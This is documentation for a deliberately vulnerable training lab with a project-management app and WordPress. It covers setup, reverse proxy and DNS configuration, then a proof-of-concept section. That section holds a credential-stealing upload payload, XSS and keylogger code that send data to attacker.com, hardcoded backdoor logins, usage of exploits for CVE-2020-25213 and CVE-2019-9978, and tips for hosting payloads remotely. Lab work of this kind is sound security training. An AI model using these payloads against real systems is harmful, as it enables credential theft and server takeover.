@@ -1,0 +1,1449 @@
+# 🚨 Vulnerable Applications Lab - Complete Documentation
+
+**⚠️ WARNING: This environment contains intentionally vulnerable applications for security research and educational purposes only. Use in isolated environments only!**
+
+---
+
+## Table of Contents
+
+1. [System Requirements and Preparation](#1-system-requirements-and-preparation)
+   - [Git Installation and Setup](#git-installation-and-setup)
+   - [Docker and Docker Compose](#docker-and-docker-compose)
+   - [Supabase CLI](#supabase-cli)
+2. [Environment Setup](#2-environment-setup)
+   - [Cloning the Repository](#cloning-the-repository)
+   - [Directory Structure](#directory-structure)
+   - [Environment Variables and Configuration](#environment-variables-and-configuration)
+3. [Container Lifecycle](#3-container-lifecycle)
+   - [How to Deploy All Containers](#how-to-deploy-all-containers)
+   - [How to Stop All Services](#how-to-stop-all-services)
+   - [How to Redeploy or Reset](#how-to-redeploy-or-reset)
+   - [Individual Service Management](#individual-service-management)
+4. [Reverse Proxy Configuration](#4-reverse-proxy-configuration)
+   - [Nginx Proxy Manager Setup](#nginx-proxy-manager-setup)
+   - [Configuring Proxy Hosts](#configuring-proxy-hosts)
+   - [Advanced Configuration](#advanced-configuration)
+5. [Local DNS Setup](#5-local-dns-setup)
+   - [Linux/macOS Configuration](#linuxmacos-configuration)
+   - [Windows Configuration](#windows-configuration)
+   - [Verification](#verification)
+6. [Vulnerability Proof of Concept](#6-vulnerability-proof-of-concept)
+   - [Project Management App Vulnerabilities](#project-management-app-vulnerabilities)
+   - [WordPress CVE Exploitation](#wordpress-cve-exploitation)
+   - [Attack Scenarios and Impact](#attack-scenarios-and-impact)
+7. [Troubleshooting](#7-troubleshooting)
+8. [Legal Disclaimer](#8-legal-disclaimer)
+
+---
+
+## 1. System Requirements and Preparation
+
+### Git Installation and Setup
+
+#### Linux (Ubuntu/Debian)
+```bash
+sudo apt update
+sudo apt install git -y
+git --version
+```
+
+#### Linux (Red Hat/CentOS/Fedora)
+```bash
+sudo yum install git -y
+# or
+sudo dnf install git -y
+git --version
+```
+
+#### macOS
+```bash
+# Using Homebrew
+brew install git
+
+# Or download from https://git-scm.com/download/mac
+git --version
+```
+
+#### Windows
+1. Download Git from: https://git-scm.com/download/win
+2. Run the installer with default settings
+3. Open Git Bash or Command Prompt
+4. Verify installation:
+```cmd
+git --version
+```
+
+#### Git Configuration
+```bash
+git config --global user.name "Your Name"
+git config --global user.email "your.email@example.com"
+```
+
+### Docker and Docker Compose
+
+#### Linux (Ubuntu/Debian)
+```bash
+# Install Docker
+curl -fsSL https://get.docker.com -o get-docker.sh
+sudo sh get-docker.sh
+
+# Add user to docker group
+sudo usermod -aG docker $USER
+newgrp docker
+
+# Install Docker Compose
+sudo apt install docker-compose-plugin -y
+
+# Verify installation
+docker --version
+docker compose version
+```
+
+#### Linux (Red Hat/CentOS/Fedora)
+```bash
+# Install Docker
+sudo yum install -y yum-utils
+sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
+sudo yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin -y
+
+# Start Docker service
+sudo systemctl start docker
+sudo systemctl enable docker
+
+# Add user to docker group
+sudo usermod -aG docker $USER
+newgrp docker
+
+# Verify installation
+docker --version
+docker compose version
+```
+
+#### macOS
+1. Download Docker Desktop from: https://www.docker.com/products/docker-desktop
+2. Install Docker Desktop
+3. Start Docker Desktop from Applications
+4. Verify installation:
+```bash
+docker --version
+docker compose version
+```
+
+#### Windows
+1. Download Docker Desktop from: https://www.docker.com/products/docker-desktop
+2. Install Docker Desktop
+3. Restart Windows when prompted
+4. Start Docker Desktop
+5. Verify installation in PowerShell:
+```powershell
+docker --version
+docker compose version
+```
+
+**System Requirements:**
+- Minimum: 4GB RAM, 2 CPU cores, 20GB disk space
+- Recommended: 8GB RAM, 4 CPU cores, 50GB disk space
+
+### Supabase CLI
+
+#### Linux/macOS
+```bash
+# Using npm
+npm install -g supabase
+
+# Or using Homebrew (macOS)
+brew install supabase/tap/supabase
+
+# Verify installation
+supabase --version
+```
+
+#### Windows
+```powershell
+# Using npm
+npm install -g supabase
+
+# Or using Scoop
+scoop bucket add supabase https://github.com/supabase/scoop-bucket.git
+scoop install supabase
+
+# Verify installation
+supabase --version
+```
+
+**Port Requirements:**
+The following ports must be available:
+- **80, 443, 81** - Nginx Proxy Manager (HTTP, HTTPS, Admin UI)
+- **3000** - Project Management Web App
+- **8080** - WordPress
+- **54321-54327** - Supabase services
+
+---
+
+## 2. Environment Setup
+
+### Cloning the Repository
+
+```bash
+# Clone the repository
+git clone <repository-url>
+cd vulnapps-example
+
+# Make scripts executable (Linux/macOS)
+chmod +x scripts/*.sh
+chmod +x wordpress/*.sh
+```
+
+### Directory Structure
+
+The project is organized into two main directories:
+
+```
+vulnapps-example/
+├── DOCUMENTATION.md                      # This file
+├── docker-compose.yml                    # Main orchestration file
+├── scripts/
+│   ├── deploy.sh                        # Deployment script
+│   └── stop.sh                          # Shutdown script
+├── supabase/                            # Supabase configuration
+│   ├── config.toml
+│   └── migrations/
+├── wordpress/                           # Vulnerable WordPress Lab
+│   ├── README.md
+│   ├── exploits/
+│   │   ├── cve-2020-25213-file-manager-rce.py
+│   │   ├── cve-2019-9978-remote.py
+│   │   ├── payload.txt
+│   │   └── PAYLOAD_HOSTING_GUIDE.md
+│   └── NGINX_PROXY_MANAGER_SETUP.md
+└── project-management/                  # Vulnerable Project Management App
+    ├── src/                            # React/TypeScript source code
+    ├── public/                         # Static assets
+    ├── Dockerfile                      # Container build file
+    ├── nginx.conf                      # Production web server config
+    ├── package.json                    # Node.js dependencies
+    ├── .env                           # Development configuration
+    ├── .env.production                 # Production configuration
+    ├── vulnerability-docs/             # Vulnerability documentation
+    │   ├── VULNERABILITY_DOCUMENTATION.md
+    │   ├── BROKEN_AUTHENTICATION_DOCUMENTATION.md
+    │   ├── BROKEN_ACCESS_CONTROL_EXPLOITATION.md
+    │   ├── COOKIE_VULNERABILITY_TEST.md
+    │   ├── FILE_UPLOAD_RCE_MITIGATION.md
+    │   ├── LAPORAN_XSS_ATTACK.md
+    │   └── XSS_SIMPLE_GUIDE.md
+    ├── listener/                       # Attack listener (for XSS/RCE demo)
+    │   ├── listener.js
+    │   └── payload/
+    └── payload/                        # Attack payloads
+```
+
+### Environment Variables and Configuration
+
+#### Project Management App
+
+**Development Configuration (`.env`)**
+```env
+VITE_SUPABASE_URL=http://localhost:54321
+VITE_SUPABASE_ANON_KEY=sb_publishable_ACJWlzQHlZjBrEguHvfOxg_3BJgxAaH
+```
+
+**Production Configuration (`.env.production`)**
+```env
+# For network access, change localhost to your domain or IP
+VITE_SUPABASE_URL=http://project.tujuh/api
+VITE_SUPABASE_ANON_KEY=sb_publishable_ACJWlzQHlZjBrEguHvfOxg_3BJgxAaH
+```
+
+#### WordPress Configuration
+
+WordPress does not use environment files for configuration. Instead:
+
+1. **Database credentials** are configured in `docker-compose.yml`
+2. **Site URL** must be configured during WordPress installation
+3. **Always install WordPress using the NPM domain** (http://wordpress.tujuh)
+
+**Important Notes:**
+- Install WordPress through Nginx Proxy Manager domain to avoid URL mismatches
+- Database credentials are intentionally weak for testing purposes
+- For production use, always change default passwords
+- If you install via `http://localhost:8080`, WordPress will save that URL and NPM access won't work properly
+
+---
+
+## 3. Container Lifecycle
+
+### How to Deploy All Containers
+
+The deployment script automatically handles all services:
+
+```bash
+# From the project root directory
+./scripts/deploy.sh
+```
+
+**What the deployment script does:**
+
+1. ✅ Checks if Docker is running
+2. ✅ Stops any existing services
+3. ✅ Creates Docker network (`vulnapp-network`)
+4. ✅ Starts Supabase services (PostgreSQL, Kong, Studio, etc.)
+5. ✅ Connects Supabase containers to the network
+6. ✅ Builds and starts the Project Management web app
+7. ✅ Starts WordPress and MySQL containers
+8. ✅ Starts Nginx Proxy Manager
+9. ✅ Configures WordPress URL (automated)
+10. ✅ Displays service URLs and access information
+
+**Expected Output:**
+```
+🚀 Starting deployment of Vulnerable Web App...
+Checking Docker...
+✅ Docker is running
+
+📦 Stopping existing services...
+🌐 Creating Docker network...
+🗄️  Starting Supabase services...
+🔗 Connecting Supabase to network...
+✅ Supabase containers connected
+🏗️  Building and starting web app...
+⏳ Waiting for services to be ready...
+🔧 Configuring WordPress...
+✅ Deployment complete!
+
+📊 Service URLs:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🌐 Web Application:        http://localhost:3000
+🔧 Nginx Proxy Manager:   http://localhost:81
+   Default credentials:   admin@example.com / changeme
+📡 Supabase API:          http://localhost:54321
+🎨 Supabase Studio:       http://localhost:54323
+📧 Mailpit (Emails):      http://localhost:54324
+🐛 WordPress (Vulnerable): http://localhost:8080
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+```
+
+### How to Stop All Services
+
+```bash
+# From the project root directory
+./scripts/stop.sh
+```
+
+**What the stop script does:**
+
+1. ✅ Stops all Docker Compose services
+2. ✅ Removes Docker containers
+3. ✅ Cleans up WordPress volumes
+4. ✅ Stops Supabase services
+5. ✅ Clears Supabase port conflicts (54321-54327)
+6. ✅ Displays cleanup summary
+
+### How to Redeploy or Reset
+
+**Complete Reset (Fresh Start):**
+```bash
+# Stop everything
+./scripts/stop.sh
+
+# Remove all volumes (WARNING: This deletes all data!)
+docker volume rm wordpress-data wordpress-db-data npm-data npm-letsencrypt 2>/dev/null || true
+
+# Clean Supabase data
+supabase db reset
+
+# Deploy again
+./scripts/deploy.sh
+```
+
+**Rebuild Project Management App Only:**
+```bash
+docker-compose up -d --build webapp
+```
+
+**Rebuild WordPress Only:**
+```bash
+docker-compose up -d --force-recreate wordpress
+```
+
+**Reset WordPress Database:**
+```bash
+# Stop WordPress
+docker-compose stop wordpress wordpress-db
+
+# Remove database volume
+docker volume rm wordpress-db-data
+
+# Start again (will create fresh database)
+docker-compose up -d wordpress wordpress-db
+```
+
+**Reset Supabase Database:**
+```bash
+supabase db reset
+```
+
+### Individual Service Management
+
+**View Running Containers:**
+```bash
+docker ps
+```
+
+**View Logs:**
+```bash
+# All services
+docker-compose logs -f
+
+# Specific service
+docker-compose logs -f webapp
+docker-compose logs -f wordpress
+docker-compose logs -f nginx-proxy-manager
+
+# Supabase logs
+docker logs -f supabase_kong_managment
+```
+
+**Restart a Service:**
+```bash
+docker-compose restart webapp
+docker-compose restart wordpress
+```
+
+**Execute Commands in Containers:**
+```bash
+# WordPress CLI
+docker exec vulnerable-wordpress wp --info --allow-root
+
+# MySQL CLI
+docker exec -it wordpress-mysql mysql -u wordpress -pvulnerable_wp_pass wordpress
+
+# Check WordPress URL configuration
+docker exec wordpress-mysql mysql -u wordpress -pvulnerable_wp_pass wordpress \
+  -e "SELECT option_name, option_value FROM wp_options WHERE option_name IN ('siteurl', 'home');"
+```
+
+---
+
+## 4. Reverse Proxy Configuration
+
+### Nginx Proxy Manager Setup
+
+Nginx Proxy Manager provides a web UI for managing reverse proxy configurations, SSL certificates, and access control.
+
+**Access the Admin UI:**
+```
+URL: http://localhost:81
+Default Email: admin@example.com
+Default Password: changeme
+```
+
+**First-Time Setup:**
+1. Login with default credentials
+2. Change your email and password when prompted
+3. Note the new credentials securely
+
+### Configuring Proxy Hosts
+
+#### For Project Management App (`project.tujuh`)
+
+**Step 1: Add Main Application Proxy**
+
+1. Go to **Nginx Proxy Manager** → **Proxy Hosts** → **Add Proxy Host**
+2. Configure **Details** tab:
+   - **Domain Names**: `project.tujuh`
+   - **Scheme**: `http`
+   - **Forward Hostname/IP**: `webapp` (container name)
+   - **Forward Port**: `80`
+   - **Cache Assets**: ✅ Enable
+   - **Block Common Exploits**: ✅ Enable
+   - **Websockets Support**: ✅ Enable
+
+**Step 2: Configure Advanced Settings for API Proxy**
+
+1. Click on **Advanced** tab
+2. Add the following configuration:
+
+```nginx
+# Proxy API calls to Supabase
+location /api/ {
+    rewrite ^/api/(.*) /$1 break;
+    proxy_pass http://10.34.100.160:54321;
+    proxy_set_header Host $host;
+    proxy_set_header X-Real-IP $remote_addr;
+    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    proxy_set_header X-Forwarded-Proto $scheme;
+    
+    # CORS headers
+    add_header 'Access-Control-Allow-Origin' '*' always;
+    add_header 'Access-Control-Allow-Methods' 'GET, POST, PUT, DELETE, OPTIONS' always;
+    add_header 'Access-Control-Allow-Headers' 'apikey,authorization,content-type,x-client-info,x-supabase-api-version' always;
+    
+    # Handle preflight requests
+    if ($request_method = 'OPTIONS') {
+        return 204;
+    }
+}
+
+# Main app - proxy to webapp container
+location / {
+    proxy_pass http://webapp:80;
+    proxy_set_header Host $host;
+    proxy_set_header X-Real-IP $remote_addr;
+    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    proxy_set_header X-Forwarded-Proto $scheme;
+}
+```
+
+3. Click **Save**
+
+**Note:** Replace `10.34.100.160` with your host machine's IP address. Find it with:
+```bash
+# Linux/macOS
+ip addr show | grep "inet " | grep -v 127.0.0.1
+
+# Windows
+ipconfig | findstr IPv4
+```
+
+#### For WordPress (`wordpress.tujuh`)
+
+1. Go to **Nginx Proxy Manager** → **Proxy Hosts** → **Add Proxy Host**
+2. Configure **Details** tab:
+   - **Domain Names**: `wordpress.tujuh`
+   - **Scheme**: `http`
+   - **Forward Hostname/IP**: `vulnerable-wordpress` (container name)
+   - **Forward Port**: `80`
+   - **Cache Assets**: ✅ Enable
+   - **Block Common Exploits**: ❌ Disable (for vulnerability testing)
+   - **Websockets Support**: ✅ Enable
+3. Click **Save**
+
+### Advanced Configuration
+
+#### SSL/TLS Setup with Let's Encrypt
+
+1. Ensure your domain points to your server's public IP
+2. Edit the Proxy Host
+3. Go to **SSL** tab:
+   - **SSL Certificate**: Request a new SSL Certificate
+   - **Force SSL**: ✅ Enable
+   - **HTTP/2 Support**: ✅ Enable
+   - **HSTS Enabled**: ✅ Enable
+   - **Email Address**: Your email for Let's Encrypt
+   - **I Agree to the Let's Encrypt Terms**: ✅ Enable
+4. Click **Save**
+
+#### Access Lists (IP Restrictions)
+
+1. Go to **Access Lists** → **Add Access List**
+2. Configure:
+   - **Name**: "Internal Network Only"
+   - **Satisfy Any**: Allow access if any rule matches
+   - **Pass Authentication**: If access is allowed, don't prompt for credentials
+3. Add **Authorization** rules:
+   - **Type**: Allow
+   - **IP Address**: `10.34.100.0/24` (your subnet)
+4. Apply to Proxy Host:
+   - Edit Proxy Host → **Details** tab
+   - **Access List**: Select "Internal Network Only"
+
+#### Custom Locations
+
+For more complex routing, use custom locations:
+
+1. Edit Proxy Host → **Custom Locations** tab
+2. Add Location:
+   - **Define Location**: `/wp-admin/`
+   - **Scheme**: `http`
+   - **Forward Hostname/IP**: `vulnerable-wordpress`
+   - **Forward Port**: `80`
+   - **Advanced Config**:
+   ```nginx
+   # Restrict admin access
+   allow 10.34.100.0/24;
+   deny all;
+   ```
+
+---
+
+## 5. Local DNS Setup
+
+To access the applications using domain names (e.g., `project.tujuh`, `wordpress.tujuh`), you need to configure your hosts file.
+
+### Linux/macOS Configuration
+
+**Edit the hosts file:**
+```bash
+sudo nano /etc/hosts
+```
+
+**Add the following lines:**
+```
+# Vulnerable Apps Lab
+10.34.100.160    project.tujuh
+10.34.100.160    wordpress.tujuh
+```
+
+**Note:** Replace `10.34.100.160` with your server's IP address. If testing locally, use `127.0.0.1`.
+
+**Save and exit:**
+- Press `Ctrl+X`
+- Press `Y` to confirm
+- Press `Enter`
+
+**Verify configuration:**
+```bash
+cat /etc/hosts | grep tujuh
+```
+
+### Windows Configuration
+
+**Step 1: Open Notepad as Administrator**
+1. Press `Windows Key`
+2. Type "Notepad"
+3. Right-click on **Notepad**
+4. Select **Run as administrator**
+
+**Step 2: Open hosts file**
+1. In Notepad, click **File** → **Open**
+2. Navigate to: `C:\Windows\System32\drivers\etc\`
+3. Change file filter from "Text Documents (*.txt)" to **All Files (*.*)**
+4. Select the `hosts` file
+5. Click **Open**
+
+**Step 3: Add entries**
+
+Add the following lines at the end of the file:
+```
+# Vulnerable Apps Lab
+10.34.100.160    project.tujuh
+10.34.100.160    wordpress.tujuh
+```
+
+**Note:** Replace `10.34.100.160` with your server's IP address. If testing locally, use `127.0.0.1`.
+
+**Step 4: Save and close**
+1. Click **File** → **Save**
+2. Close Notepad
+
+**Flush DNS cache:**
+```cmd
+ipconfig /flushdns
+```
+
+### Verification
+
+**Test DNS resolution:**
+
+**Linux/macOS:**
+```bash
+ping -c 2 project.tujuh
+ping -c 2 wordpress.tujuh
+```
+
+**Windows:**
+```cmd
+ping project.tujuh
+ping wordpress.tujuh
+```
+
+**Test in browser:**
+1. Open browser
+2. Navigate to `http://project.tujuh` (if using proxy on port 80)
+3. Navigate to `http://wordpress.tujuh` (if using proxy on port 80)
+
+**Without proxy (direct access):**
+- Project Management App: `http://localhost:3000`
+- WordPress: `http://localhost:8080`
+- Nginx Proxy Manager: `http://localhost:81`
+
+---
+
+## 6. Vulnerability Proof of Concept
+
+This section documents the intentional vulnerabilities included for security research and educational purposes.
+
+### Project Management App Vulnerabilities
+
+The Project Management application (`/project-management`) contains the following CRITICAL vulnerabilities:
+
+#### 1. File Upload Remote Code Execution (RCE)
+
+**Location:** `src/components/Files/Files.tsx`
+
+**Vulnerability Description:**
+- Files are automatically executed upon upload without validation
+- JavaScript code is executed using `eval()`
+- HTML files with embedded scripts are executed
+- No file type restrictions or content sanitization
+
+**Attack Vector:**
+
+1. Create malicious JavaScript file (`payload.js`):
+```javascript
+alert('SYSTEM COMPROMISED!');
+console.log('Cookie:', document.cookie);
+console.log('LocalStorage:', localStorage);
+document.body.style.border = '5px solid red';
+
+// Steal credentials from cookies
+const cookies = document.cookie.split(';').reduce((acc, cookie) => {
+    const [key, value] = cookie.trim().split('=');
+    acc[key] = value;
+    return acc;
+}, {});
+
+alert('CREDENTIALS STOLEN!\n' +
+      'Email: ' + (cookies.user_email || 'None') + '\n' +
+      'Password: ' + (cookies.user_password || 'None'));
+```
+
+2. Login to the application
+3. Navigate to a project
+4. Click "Files" tab
+5. Upload `payload.js`
+6. **Payload executes automatically!**
+
+**Business Impact:**
+- Complete system compromise
+- Credential theft
+- Data exfiltration
+- Backdoor installation
+- Session hijacking
+
+#### 2. Stored Cross-Site Scripting (XSS) in Chat
+
+**Location:** `src/components/Chat/Chat.tsx`
+
+**Vulnerability Description:**
+- Chat messages use `innerHTML` without sanitization
+- XSS payloads are stored permanently in database
+- All users viewing the chat are affected
+
+**Attack Vector:**
+
+1. Navigate to Chat
+2. Send message:
+```html
+<script>alert('XSS ATTACK!')</script>
+```
+
+3. Or use image-based payload:
+```html
+<img src="x" onerror="alert('Cookie: ' + document.cookie)">
+```
+
+4. Payload executes for every user viewing the chat
+
+**Advanced Payload (Keylogger):**
+```html
+<img src="x" onerror="
+document.addEventListener('keydown', function(e) {
+    fetch('http://attacker.com/log?key=' + e.key);
+});
+alert('Keylogger installed!');
+">
+```
+
+#### 3. Cookie-Based Credential Storage (CRITICAL)
+
+**Location:** `src/contexts/AuthContext.tsx`
+
+**Vulnerability Description:**
+- Passwords stored in plaintext in cookies
+- Credentials accessible via `document.cookie`
+- No encryption or secure storage
+- Credentials persist after logout
+
+**Attack Vector:**
+
+1. Login with any credentials
+2. Open Developer Tools (F12)
+3. Go to **Application** → **Storage** → **Cookies**
+4. See plaintext credentials:
+   - `user_email`
+   - `user_password` (plaintext!)
+   - `user_id`
+   - `user_role`
+
+5. Steal via JavaScript:
+```javascript
+const cookies = document.cookie.split(';').reduce((acc, cookie) => {
+    const [key, value] = cookie.trim().split('=');
+    acc[key] = value;
+    return acc;
+}, {});
+console.log('Stolen credentials:', cookies);
+```
+
+#### 4. Broken Authentication (CRITICAL)
+
+**Location:** `src/components/Auth/LoginForm.tsx`, `RegisterForm.tsx`
+
+**Vulnerability Description:**
+- No password strength requirements (accepts "1", "a", "123")
+- Unlimited login attempts (no rate limiting or account lockout)
+- Hidden backdoor accounts with hardcoded credentials
+- Insecure session management
+
+**Backdoor Accounts:**
+- Email: `admin@backdoor.com`, Password: `123`
+- Email: `test@test.com`, Password: `test`
+- Email: `guest@guest.com`, Password: (empty)
+
+**Attack Vector:**
+
+1. Test weak password registration:
+   - Register with password: "1" ✅ Accepted
+   - Register with password: "a" ✅ Accepted
+
+2. Brute force attack:
+   - Unlimited login attempts
+   - No account lockout
+   - No CAPTCHA
+
+3. Backdoor access:
+   - Login with `admin@backdoor.com` : `123`
+   - Instant admin access!
+
+#### 5. Combined Attack Scenario
+
+**Ultimate Exploitation Chain:**
+
+```javascript
+// Save as ultimate_exploit.js and upload via Files
+
+// 1. Display breach notification
+alert('🚨 SYSTEM COMPROMISED! 🚨');
+
+// 2. Steal credentials from cookies
+const cookies = document.cookie.split(';').reduce((acc, cookie) => {
+    const [key, value] = cookie.trim().split('=');
+    acc[key] = value;
+    return acc;
+}, {});
+
+const stolen = {
+    email: cookies.user_email,
+    password: cookies.user_password, // PLAINTEXT!
+    userID: cookies.user_id,
+    role: cookies.user_role,
+    allCookies: document.cookie,
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage),
+    url: window.location.href,
+    timestamp: new Date().toString()
+};
+
+console.log('🔥 COMPLETE DATA BREACH:', stolen);
+
+// 3. Send to attacker server (replace with your listener)
+fetch('http://attacker.com/collect', {
+    method: 'POST',
+    body: JSON.stringify(stolen),
+    headers: {'Content-Type': 'application/json'}
+});
+
+// 4. Install persistent backdoor
+localStorage.setItem('backdoor', JSON.stringify({
+    credentials: stolen,
+    installedAt: new Date().toString()
+}));
+
+// 5. Install keylogger
+document.addEventListener('keydown', function(e) {
+    fetch('http://attacker.com/keylog?key=' + e.key);
+});
+
+// 6. Visual proof
+document.body.style.backgroundColor = '#ffeeee';
+document.body.style.border = '5px solid red';
+
+const banner = document.createElement('div');
+banner.innerHTML = '🚨 ACCOUNT COMPROMISED 🚨';
+banner.style.cssText = 'position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;z-index:9999;padding:10px;font-weight:bold;';
+document.body.appendChild(banner);
+
+alert('🔥 EXPLOITATION COMPLETE! All vulnerabilities chained successfully!');
+```
+
+**Steps:**
+1. Login with backdoor account (`admin@backdoor.com` : `123`)
+2. Upload `ultimate_exploit.js`
+3. Automatic execution steals all credentials
+4. Backdoor installed in localStorage
+5. Keylogger captures future input
+6. Visual proof displayed
+
+---
+
+### WordPress CVE Exploitation
+
+The WordPress application (`/wordpress`) demonstrates real-world CVE exploitation for unauthorized content promotion.
+
+#### CVE-2020-25213: File Manager RCE (CVSS 10.0)
+
+**Plugin:** WP File Manager versions 6.0-6.8  
+**Impact:** Unauthenticated Remote Code Execution  
+**Attack Type:** File Upload → PHP Backdoor → Database Manipulation
+
+**Vulnerability Description:**
+- File Manager plugin exposes `connector.minimal.php` endpoint
+- No authentication required
+- Allows arbitrary file upload including PHP shells
+- Enables full server control
+
+**Exploitation Steps:**
+
+1. **Deploy WordPress:**
+```bash
+./scripts/deploy.sh
+```
+
+2. **Complete WordPress Installation:**
+   - Navigate to `http://localhost:8080`
+   - Complete 5-minute installation wizard
+   - Login: `admin` / `admin123`
+
+3. **Install Vulnerable Plugin:**
+   - Go to **Plugins** → **Add New** → **Upload Plugin**
+   - Upload `wp-file-manager.6.4.zip` (or install from repo)
+   - Activate plugin
+
+4. **Run Exploit:**
+```bash
+cd wordpress/exploits
+python3 cve-2020-25213-file-manager-rce.py http://localhost:8080
+```
+
+**Exploit Actions:**
+1. ✅ Uploads PHP backdoor (`shell.php`)
+2. ✅ Verifies backdoor accessibility
+3. ✅ Extracts database credentials from `wp-config.php`
+4. ✅ Creates malicious post via WordPress API
+5. ✅ Promotes content (999,999 views, 9,999 comments)
+6. ✅ Makes post sticky (appears on homepage)
+7. ✅ Verifies public visibility
+
+**Expected Output:**
+```
+[+] CVE-2020-25213 File Manager RCE Exploit
+[+] Target: http://localhost:8080
+[+] Uploading backdoor...
+[+] Backdoor uploaded successfully!
+[+] Backdoor URL: http://localhost:8080/wp-content/plugins/wp-file-manager/lib/files/shell.php
+[+] Creating malicious post...
+[+] Post created with ID: 20
+[+] Promoting content with fake metrics...
+[+] Content promoted: 999,999 views, 9,999 comments
+[+] Post is sticky (homepage featured)
+[+] Verification: Post is publicly visible!
+[+] EXPLOITATION SUCCESSFUL!
+```
+
+**Business Impact:**
+- Unauthenticated content manipulation
+- Brand reputation damage
+- SEO poisoning
+- Fake news distribution
+- Complete server compromise
+
+#### CVE-2019-9978: Social Warfare RCE (CVSS 9.8)
+
+**Plugin:** Social Warfare versions 3.5.0-3.5.2  
+**Impact:** Unauthenticated Remote Code Execution via eval()  
+**Attack Type:** Debug Mode Abuse → eval() Injection → Content Creation
+
+**Vulnerability Description:**
+- Social Warfare plugin has debug mode endpoint
+- Fetches remote payload and executes with `eval()`
+- No authentication required
+- Allows arbitrary PHP code execution
+
+**Exploitation Steps:**
+
+1. **Install Social Warfare Plugin:**
+   - Download version 3.5.2
+   - Upload and activate via WordPress Admin
+
+2. **Host Payload Externally (Realistic Attack):**
+
+**Option A: GitHub Gist (Recommended)**
+   - Go to https://gist.github.com/
+   - Create new gist with filename `payload.txt`
+   - Paste the payload (see `wordpress/exploits/payload.txt`)
+   - Get raw URL: `https://gist.githubusercontent.com/USERNAME/GIST_ID/raw/HASH/payload.txt`
+
+**Option B: Pastebin**
+   - Go to https://pastebin.com/
+   - Create new paste with payload
+   - Get raw URL: `https://pastebin.com/raw/PASTE_ID`
+
+**Option C: ngrok Tunnel**
+```bash
+# Terminal 1: Start local server
+cd wordpress/exploits
+python -m http.server 8000
+
+# Terminal 2: Create tunnel
+ngrok http 8000
+# Use the HTTPS URL provided
+```
+
+3. **Run Exploit:**
+```bash
+cd wordpress/exploits
+python3 cve-2019-9978-remote.py http://localhost:8080 --payload-url https://gist.githubusercontent.com/.../payload.txt
+```
+
+**Exploit Actions:**
+1. ✅ Verifies Social Warfare debug endpoint
+2. ✅ Fetches remote payload
+3. ✅ Triggers `eval()` execution via debug mode
+4. ✅ Payload creates WordPress post via API
+5. ✅ Adds fake popularity metrics
+6. ✅ Promotes content to homepage
+7. ✅ Deletes older posts for visibility
+
+**Expected Output:**
+```
+[+] CVE-2019-9978 Social Warfare RCE Exploit
+[+] Target: http://localhost:8080
+[+] Payload URL: https://gist.githubusercontent.com/.../payload.txt
+[+] Testing payload accessibility...
+[+] Payload is accessible!
+[+] Triggering Social Warfare debug mode...
+[+] Exploit sent! Check WordPress for results.
+[+] Parsing response...
+[+] Post created with ID: 24
+[+] Post is published and sticky!
+[+] EXPLOITATION SUCCESSFUL!
+```
+
+**Payload Content (`payload.txt`):**
+```php
+<pre>
+(function(){
+    require_once('/var/www/html/wp-load.php');
+    
+    $post_data = array(
+        'post_title' => 'EXPLOITED: Unauthorized Content via CVE-2019-9978',
+        'post_content' => '<h1>🚨 SECURITY BREACH 🚨</h1>
+<p>This post was created WITHOUT AUTHENTICATION via CVE-2019-9978</p>',
+        'post_status' => 'publish',
+        'post_author' => 1,
+        'post_type' => 'post',
+        'comment_status' => 'open'
+    );
+    
+    $post_id = wp_insert_post($post_data);
+    
+    if($post_id) {
+        global $wpdb;
+        $wpdb->update($wpdb->posts, 
+            array('comment_count' => 9999), 
+            array('ID' => $post_id)
+        );
+        update_post_meta($post_id, 'post_views_count', 999999);
+        stick_post($post_id);
+        die("POST_ID:" . $post_id . "|STATUS:published");
+    }
+    
+    return array();
+})()
+</pre>
+```
+
+#### Attack Impact Demonstration
+
+**Unauthorized Content Promotion Checklist:**
+- ✅ Create posts without authentication
+- ✅ Promote content to homepage (sticky posts)
+- ✅ Add fake popularity metrics (views, comments)
+- ✅ Manipulate SEO rankings
+- ✅ Delete legitimate content
+- ✅ Inject malicious scripts
+- ✅ Distribute fake news
+- ✅ Damage brand reputation
+
+**Database Verification:**
+```bash
+# Check promoted posts
+docker exec wordpress-mysql mysql -u wordpress -pvulnerable_wp_pass wordpress \
+  -e "SELECT ID, post_title, post_status, comment_count FROM wp_posts WHERE post_type='post' ORDER BY ID DESC LIMIT 5;"
+
+# Check sticky posts
+docker exec wordpress-mysql mysql -u wordpress -pvulnerable_wp_pass wordpress \
+  -e "SELECT option_value FROM wp_options WHERE option_name='sticky_posts';"
+
+# Check post metadata
+docker exec wordpress-mysql mysql -u wordpress -pvulnerable_wp_pass wordpress \
+  -e "SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN (SELECT ID FROM wp_posts WHERE post_status='publish') ORDER BY post_id DESC;"
+```
+
+**Verify Public Visibility:**
+1. Open browser to `http://localhost:8080`
+2. Malicious post appears on homepage
+3. Shows fake metrics (999,999 views, 9,999 comments)
+4. Sticky post stays at top
+5. Older legitimate posts hidden
+
+---
+
+### Attack Scenarios and Impact
+
+#### Scenario 1: Corporate Espionage
+
+**Attacker Goal:** Steal employee credentials and sensitive data
+
+**Attack Chain:**
+1. Access Project Management App
+2. Use backdoor account (`admin@backdoor.com`)
+3. Upload keylogger via File Upload RCE
+4. Inject XSS payload in Chat
+5. Collect credentials from cookies
+6. Exfiltrate project data
+7. Maintain persistent access
+
+**Business Impact:**
+- Credential theft: ALL user accounts compromised
+- Data breach: Confidential projects exposed
+- Regulatory violation: GDPR, SOC 2 compliance failure
+- Financial loss: Fines, legal costs, reputation damage
+
+#### Scenario 2: Ransomware Distribution
+
+**Attacker Goal:** Distribute ransomware via WordPress
+
+**Attack Chain:**
+1. Exploit CVE-2020-25213 (File Manager RCE)
+2. Upload PHP backdoor
+3. Create malicious post with fake update notification
+4. Promote to homepage (sticky post)
+5. Users download "update" → ransomware
+6. Encrypt files and demand payment
+
+**Business Impact:**
+- Customer device compromise
+- Legal liability for malware distribution
